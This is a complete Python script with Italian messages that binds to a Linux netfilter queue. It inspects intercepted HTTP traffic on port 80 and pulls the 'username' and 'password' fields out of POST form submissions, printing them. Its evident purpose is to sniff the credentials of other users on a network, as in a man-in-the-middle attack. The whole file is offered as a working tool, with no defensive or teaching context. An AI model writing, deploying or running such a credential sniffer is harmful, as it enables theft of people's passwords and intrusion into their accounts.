import zlib
from scapy.all import *
from netfilterqueue import NetfilterQueue
import urllib.parse


def decompress_gzip(compressed_data):
    try:
        return zlib.decompress(compressed_data, 16+zlib.MAX_WBITS)
    except zlib.error as e:
        print(f"Errore decompressione GZIP: {e}")
        return None


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(TCP):
        if scapy_packet.dport == 80 or scapy_packet.sport == 80: 
            
            if scapy_packet.haslayer(Raw):
                payload = scapy_packet[Raw].load
                if b"Content-Encoding: gzip" in payload:
                    print("Dati GZIP rilevati nella risposta.")
                    
                    compressed_data = payload.split(b'\r\n\r\n')[1]
                    decompressed_data = decompress_gzip(compressed_data)
                
                
                if b"POST" in scapy_packet[Raw].load:
                    try:
                        # Trova form
                        form_data = payload.split(b'\r\n\r\n')[1]
                        form_data = urllib.parse.parse_qs(form_data.decode('utf-8', errors='ignore'))
                        
                        
                        username = form_data.get('username')
                        password = form_data.get('password')
                        
                        
                        print("Form trovato: Username: ", username, " Password: ", password)
                    except:
                        print("Errore nell'estrazione dei dati del form")

    packet.accept()

nfqueue = NetfilterQueue()

nfqueue.bind(1, process_packet)

try:
    print("Inizio monitoraggio pacchetti...")
    nfqueue.run() 
except KeyboardInterrupt:
    print("\nInterruzione del monitoraggio pacchetti.")
    nfqueue.unbind()
